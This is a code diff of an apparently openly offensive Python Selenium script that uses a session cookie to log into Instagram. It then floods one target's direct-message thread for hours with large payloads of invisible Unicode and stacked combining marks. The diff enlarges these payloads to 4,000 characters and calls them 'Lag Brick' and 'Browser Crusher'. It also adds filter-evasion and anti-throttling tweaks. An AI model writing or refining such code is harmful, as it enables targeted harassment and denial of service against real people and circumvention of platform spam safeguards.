@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER NC (MAX IMPACT)
-# 📅 STATUS: DOM KILLER | 2 THREADS | HYPER-BURST
+# 🚀 PROJECT: PRAVEER NC (ULTRA BLOAT)
+# 📅 STATUS: 4K PAYLOAD | RAM-OPTIMIZED | 2 THREADS
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -9,35 +9,29 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
 
-# --- HYPER-IMPACT CONFIG ---
+# --- ULTRA-BLOAT CONFIG ---
 THREADS = 2             
 TOTAL_DURATION = 21600  
-BURST_SPEED = (0.01, 0.05) # Extreme speed (No delay)
-SESSION_LIMIT = 120     
+BURST_SPEED = (0.01, 0.08) 
+# RELOAD REDUCED TO 90s: Prevents the 170-message slowdown
+SESSION_LIMIT = 90     
 
 GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 
-def get_max_impact_payload(target):
-    """Generates a massive memory-bloating payload."""
-    # Recursive Zalgo (Strips of overlapping marks)
-    z = "̸" * 15
-    praveer_glitch = "".join(c + z for c in "PRAVEER_OWNZ")
+def get_ultra_bloat_payload(target):
+    """Generates a 4,000+ character Lag Brick."""
+    # Recursive Zalgo Stacking
+    z_tower = "̸" * 20
+    praveer_header = "".join(c + z_tower for c in f"PRAVEER_OWNZ_{target.upper()}")
     
-    # 2500+ Char Buffer (The 'Lag Brick')
-    # Using specific Unicode blocks that force complex browser calculations
-    bloat_chars = ["\u200B", "\u200C", "\u200D", "\u200E", "\u202E", "\u2060"]
-    bloat = "".join(random.choice(bloat_chars) for _ in range(2500))
+    # Massive Unicode Buffer (The Browser Crusher)
+    # Mixing different invisible types to bypass simple text-box filters
+    bloat_types = ["\u200B", "\u200C", "\u200D", "\u2060", "‎", "‏"]
+    bloat_block = "".join(random.choice(bloat_types) for _ in range(4000))
     
-    # Construction of the DOM Overload
-    payload = (
-        f"🔥 {target.upper()} DESTROYED BY PRAVEER 🔥\n" +
-        f"{bloat}\n" +
-        f"{praveer_glitch}\n" * 5 + 
-        f"{bloat}\n" +
-        "🛑" * 50
-    )
-    return payload
+    # Payload Construction
+    return f"⚡ PRAVEER IMPACT ⚡\n{bloat_block}\n{praveer_header}\n{bloat_block}\n🛑🛑🛑"
 
 def get_driver(agent_id):
     chrome_options = Options()
@@ -45,21 +39,18 @@ def get_driver(agent_id):
     chrome_options.add_argument("--no-sandbox") 
     chrome_options.add_argument("--disable-dev-shm-usage")
     chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--memory-pressure-off") # Prevents Chrome from throttling
     
-    # Standard PC Emulation for higher data throughput
-    chrome_options.add_argument("--window-size=1920,1080")
-    
-    temp_dir = os.path.join(tempfile.gettempdir(), f"max_praveer_{agent_id}_{int(time.time())}")
+    temp_dir = os.path.join(tempfile.gettempdir(), f"ultra_praveer_{agent_id}_{int(time.time())}")
     chrome_options.add_argument(f"--user-data-dir={temp_dir}")
 
     driver = webdriver.Chrome(options=chrome_options)
-    driver.custom_temp_path = temp_dir
     return driver
 
 def adaptive_inject(driver, text):
     try:
-        # Direct Injection: Bypasses 'typing' lag entirely
         box = driver.find_element(By.XPATH, "//div[@role='textbox']")
+        # Fast Injection Logic
         driver.execute_script("""
             var el = arguments[0];
             el.focus();
@@ -87,28 +78,30 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
             driver.refresh()
-            time.sleep(5)
+            time.sleep(6)
             
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(5)
+            time.sleep(6)
 
+            # --- MESSAGE LOOP ---
             while (time.time() - session_start) < SESSION_LIMIT:
-                payload = get_max_impact_payload(os.getenv("TARGET_NAME", "User"))
+                payload = get_ultra_bloat_payload(os.getenv("TARGET_NAME", "User"))
+                
                 if adaptive_inject(driver, payload):
                     with COUNTER_LOCK:
                         GLOBAL_SENT += 1
-                        print(f"[!] IMPACT {GLOBAL_SENT} | PRAVEER DOM KILLER ACTIVE", flush=True)
+                        if GLOBAL_SENT % 10 == 0:
+                            print(f"[!] {GLOBAL_SENT} ULTRA-IMPACTS | BUFFER SIZE: 4K", flush=True)
                 
-                # Zero to minimal delay for maximum pressure
                 time.sleep(random.uniform(*BURST_SPEED))
 
         except Exception:
-            pass # Keep alive at all costs
+            pass 
         finally:
             if driver: driver.quit()
             if temp_path and os.path.exists(temp_path): shutil.rmtree(temp_path, ignore_errors=True)
             gc.collect()
-            time.sleep(2)
+            time.sleep(1)
 
 def main():
     cookie = os.environ.get("SESSION_ID", "").strip()
